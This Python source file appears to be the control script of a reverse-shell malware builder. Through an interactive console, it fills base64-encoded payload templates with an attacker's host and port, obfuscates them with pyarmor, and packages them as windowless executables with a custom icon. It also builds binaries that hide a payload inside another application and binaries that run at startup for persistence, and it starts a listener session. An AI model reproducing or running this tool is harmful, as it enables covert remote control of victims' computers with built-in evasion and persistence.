from modules.session import Session
from modules.color import Color
from rich.console import Console
from rich.table import Table
import shutil
import subprocess
import os
import base64
import tempfile
import platform
import datetime
import signal
from modules.encode_base import EncodeBase

variablesConfig: dict = {
    "session.lhost": "localhost",
    "session.lport": 4444,
    "generate.lhost": "localhost",
    "generate.name": "payload",
    "generate.lport": 4444,
    "windows.autoexe.path": None,
    "windows.hiddenexe.app": None,
    "windows.hiddenexe.payload": None,
    "windows.hiddenexe.path": None,
    "build.icon": None,
}


def load_banner():
    with open("banner.txt", "r") as banner:
        print(banner.read())


def set_var(command):
    variable, value = command.split(" ")[1:]
    if variable not in variablesConfig:
        print(f"{Color.OKGREEN}Variable not found{Color.DEFAULT}")
        return
    variablesConfig[variable] = value
    print(f"{Color.OKBLUE}{variable} set to {value}{Color.DEFAULT}")


def help(_):
    for command, data in commands.items():
        table = Table(title=command, title_style="bold green", title_justify="start")
        table.add_column("Variable")
        table.add_column("Description")

        is_required = lambda x: x in data["required"] and "required" or "optional"

        for var in data["vars"]:
            label = f"variable {is_required(var)}"
            table.add_row(var, label)
        table.add_row("Description", data["description"])
        table.add_row("Platform", data["platform"])

        console = Console()
        console.print(table)


def start_session(command):
    Session(
        variablesConfig["session.lhost"], int(variablesConfig["session.lport"])
    ).start()


def read_payload():
    payload = base64.b64decode(EncodeBase.PAYLOAD_TYPE_SHELL)
    return (
        payload.decode()
        .replace("${LHOST}", f"'{variablesConfig["generate.lhost"]}'")
        .replace("${LPORT}", str(variablesConfig["generate.lport"]))
    )


def generate(_):
    try:
        payload = read_payload()
        print(f"{Color.WARNING}Generating payload{Color.DEFAULT}")

        temp = temp_file(payload)

        encrypt_pyarmor(temp, "payload")

        ofuscated_path = os.path.join("dist", os.path.basename(temp))

        print(f"{Color.OKGREEN}Building payload{Color.DEFAULT}")

        subprocess.run(
            [
                "pyinstaller",
                "--onefile",
                "--icon",
                variablesConfig["build.icon"],
                "--noconsole",
                ofuscated_path,
            ],
            stderr=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=get_flag_system(),
        )

        print(f"{Color.OKGREEN}Payload generated successfully{Color.DEFAULT}")

        extension = ".exe" if platform.system() == "Windows" else ""

        name_file = variablesConfig["generate.name"]

        clear(temp, f"{name_file}-{get_id()}{extension}", extension)

    except Exception as e:
        print(f"{Color.FAIL}Error generating payload: {e}{Color.DEFAULT}")


def get_flag_system():
    return platform.system() == "Windows" and subprocess.CREATE_NO_WINDOW or 0


def encrypt_pyarmor(path: str, name: str):
    print(f"{Color.OKGREEN}Obfuscating {name}{Color.DEFAULT}")

    return subprocess.run(
        ["pyarmor", "gen", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        creationflags=get_flag_system(),
    )


def clear(temp: str, new_name: str, extension: str = ".exe"):
    spec = ".spec"
    path = os.path.join("dist", os.path.basename(temp) + extension)
    if os.path.exists(path):
        os.replace(path, new_name)
    if os.path.exists(os.path.basename(temp) + spec):
        os.remove(os.path.basename(temp) + spec)
    if os.path.exists(temp):
        os.remove(temp)
    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")


def get_id():
    return datetime.datetime.now().strftime("%Y%m%d%H%M%S")


def get_payload(variable: str, value: str, payload: str):
    payload_base64 = base64.b64decode(payload)
    return payload_base64.decode().replace(variable, value)


def get_payload_vars(vars: dict, payload: str):
    payload_base64 = base64.b64decode(payload).decode()
    for key, value in vars.items():
        payload_base64 = payload_base64.replace(key, value)
    return payload_base64


def temp_file(payload: str):
    with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
        temp.write(payload)
        temp.close()
    return temp.name


def hiddenexe(_):

    payload = get_payload_vars(
        {
            "${windows.hiddenexe.name_app}": variablesConfig["windows.hiddenexe.app"],
            "${windows.hiddenexe.name_payload}": variablesConfig[
                "windows.hiddenexe.payload"
            ],
        },
        EncodeBase.HIDDEN_EXE,
    )

    temp = temp_file(payload)

    print(f"{Color.OKGREEN}Building hiddenexe{Color.DEFAULT}")

    output = subprocess.run(
        [
            "pyinstaller",
            "--onefile",
            "--add-data",
            f"{variablesConfig['windows.hiddenexe.path']};.",
            "--icon",
            variablesConfig["build.icon"],
            "--noconsole",
            temp,
        ],
        creationflags=get_flag_system(),
    )

    if output.returncode != 0:
        print(f"{Color.FAIL}Error building hiddenexe{Color.DEFAULT}")
        return

    clear(temp, f"hidden-{get_id()}.exe")

    print(f"{Color.OKGREEN}Hiddenexe generated successfully{Color.DEFAULT}")


def autoexe(_):
    path = variablesConfig["windows.autoexe.path"]

    name_file = path

    payload = get_payload(
        "${windows.autoexe.path}", name_file, EncodeBase.AUTOEXEC_PAYLOAD
    )

    temp = temp_file(payload)

    print(f"{Color.OKGREEN}Building autoexe{Color.DEFAULT}")

    output = subprocess.run(
        [
            "pyinstaller",
            "--hidden-import=win32timezone",
            "--icon",
            variablesConfig["build.icon"],
            "--add-data",
            f"{path};.",
            "--onefile",
            "--noconsole",
            temp,
        ],
        creationflags=get_flag_system(),
    )

    if output.returncode != 0:
        print(f"{Color.FAIL}Error building autoexe{Color.DEFAULT}")
        return

    clear(temp, f"autoexe-{get_id()}.exe")
    print(f"{Color.OKGREEN}Autoexe generated successfully{Color.DEFAULT}")


def signal_handler(sig, frame):
    print(f"\n{Color.OKGREEN}Come back soon :){Color.DEFAULT}")
    exit(0)


commands = {
    "help": {
        "description": "Show help message",
        "vars": [],
        "action": help,
        "platform": "all",
        "required": [],
    },
    "generate": {
        "description": "Generate a reverse shell",
        "vars": ["generate.lhost", "generate.lport", "generate.name"],
        "action": generate,
        "platform": "all",
        "required": [],
    },
    "execute": {
        "description": "Start a session",
        "vars": ["session.lhost", "session.lport"],
        "action": start_session,
        "platform": "all",
        "required": [],
    },
    "autoexe": {
        "description": "execute on startup",
        "vars": [
            "windows.autoexe.path",
            "build.icon",
        ],
        "action": autoexe,
        "platform": "Windows",
        "required": ["windows.autoexe.path"],
    },
    "hiddenexe": {
        "description": "Execute hidden",
        "vars": [
            "windows.hiddenexe.app",
            "windows.hiddenexe.payload",
            "windows.hiddenexe.path",
            "build.icon",
        ],
        "action": hiddenexe,
        "platform": "Windows",
        "required": [
            "windows.hiddenexe.app",
            "windows.hiddenexe.payload",
            "windows.hiddenexe.path",
        ],
    },
    "set": {
        "description": "Set a variable",
        "vars": ["variable", "value"],
        "action": set_var,
        "platform": "all",
        "required": [],
    },
}


def validate_vars(command):
    for var in commands[command]["required"]:
        if variablesConfig[var] is None:
            return False
    return True


load_banner()
while True:
    try:
        signal.signal(signal.SIGINT, signal_handler)
        print(f"{Color.OKBLUE}reverse_shell{Color.FAIL}@root{Color.DEFAULT}> ", end="")
        command = input()
        if command == "exit":
            signal_handler(None, None)
            break

        search = command.split(" ")[0]
        if search in commands:
            platformCommand = commands[search]["platform"]
            if platformCommand != "all" and platform.system() not in platformCommand:
                print(
                    f"{Color.FAIL}Command not supported by the platform{Color.DEFAULT}"
                )
                continue
            if not validate_vars(search):
                print(
                    f"{Color.FAIL}Variable not set in command {search}{Color.DEFAULT}"
                )
                continue
            commands[search]["action"](command)
        else:
            print(f"{Color.FAIL}Command not found{Color.DEFAULT}")
    except Exception as e:
        print(f"{Color.FAIL}Invalid syntax: {e}{Color.DEFAULT}")
